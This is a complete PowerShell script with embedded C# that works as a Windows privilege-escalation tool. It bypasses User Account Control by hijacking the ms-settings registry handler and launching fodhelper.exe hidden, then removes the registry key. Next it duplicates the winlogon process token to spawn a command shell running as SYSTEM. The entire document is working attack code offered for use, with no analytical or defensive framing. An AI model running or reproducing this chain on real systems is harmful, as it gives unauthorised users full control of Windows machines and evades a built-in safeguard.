$CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentIdentity)

if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Elevating via fodhelper..." -ForegroundColor Yellow
    
    $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $Command = "powershell.exe -ExecutionPolicy Bypass -NoExit -File `"$PSCommandPath`""
    
    New-Item -Path $RegPath -Force | Out-Null
    New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $Command | Out-Null
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "[+] Running as Administrator" -ForegroundColor Green
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[*] Using token impersonation method..." -ForegroundColor Cyan

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class TokenMagic {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    public static bool SpawnAsSystem(string app, string args) {
        Process[] procs = Process.GetProcessesByName("winlogon");
        if (procs.Length == 0) return false;
        
        IntPtr hToken, hDupToken;
        if (!OpenProcessToken(procs[0].Handle, 0x0002 | 0x0004 | 0x0008 | 0x0020, out hToken)) return false;
        if (!DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 1, out hDupToken)) { CloseHandle(hToken); return false; }
        
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.lpDesktop = "WinSta0\\Default";
        PROCESS_INFORMATION pi;
        
        bool result = CreateProcessWithTokenW(hDupToken, 0x00000002, app, args, 0x00000010, IntPtr.Zero, null, ref si, out pi);
        
        CloseHandle(hToken);
        CloseHandle(hDupToken);
        if (result) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return result;
    }
}
"@

$success = [TokenMagic]::SpawnAsSystem("cmd.exe", "cmd.exe /k title SYSTEM SHELL && whoami && echo. && echo Type 'whoami' to verify you are SYSTEM")

if ($success) {
    Write-Host "[+] SYSTEM CMD spawned successfully!" -ForegroundColor Green
    Write-Host "[!] Check your taskbar for the new CMD window!" -ForegroundColor Magenta
} else {
    Write-Host "[-] Failed to spawn. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
}

Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
